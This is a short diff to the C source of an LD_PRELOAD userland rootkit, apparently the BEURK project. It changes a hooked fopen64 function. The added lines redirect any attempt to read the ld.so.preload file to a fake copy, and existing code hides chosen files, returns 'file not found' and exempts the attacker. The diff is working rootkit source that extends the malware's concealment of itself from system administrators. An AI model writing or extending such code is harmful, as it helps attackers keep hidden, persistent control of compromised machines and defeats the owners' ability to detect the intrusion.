@@ -19,6 +19,7 @@
  */
 
 #include <errno.h> /* errno, ENOENT */
+#include <string.h> /* strstr() */
 #include "beurk.h" /* is_attacker(), is_hidden_file(), is_procnet() */
 #include "config.h" /* REAL_FOPEN64() */
 #include "debug.h" /* DEBUG() */
@@ -30,6 +31,9 @@ FILE *fopen64(const char *__restrict path, const char *mode) {
 
     if (is_attacker())
         return (REAL_FOPEN64(path, mode));
+
+    if (is_ld_preload_file(path))
+        return REAL_FOPEN64(FAKE_LD_PRELOAD, mode);
 
     if (is_hidden_file(path)) {
         errno = ENOENT;
